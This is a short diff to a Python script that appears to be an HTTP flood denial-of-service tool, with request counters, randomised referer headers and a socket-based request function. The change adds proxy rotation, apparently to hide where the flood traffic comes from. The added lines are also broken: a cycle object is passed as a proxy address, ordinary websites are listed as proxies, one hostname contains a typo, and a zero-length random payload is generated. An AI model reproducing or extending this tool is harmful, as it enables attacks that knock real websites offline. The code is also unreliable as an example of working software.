@@ -12,8 +12,9 @@ import sys
 import threading
 import random
 import re
-import time
 import socket
+import itertools
+import socks
 #global params
 url=''
 host=''
@@ -22,6 +23,8 @@ headers_referers=[]
 request_counter=0
 flag=0
 safe=0
+proxies = ['www.google.com','www.cloudflare com']
+prox = itertools.cycle(proxies)
 def inc_counter():
 	global request_counter
 	request_counter+=1
@@ -80,6 +83,7 @@ def httpcall(url):
 	referer_list()
 	code=0
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, prox, 80)
 	bytes = random._urandom(0)
 	pkt_count = 0
 	try:
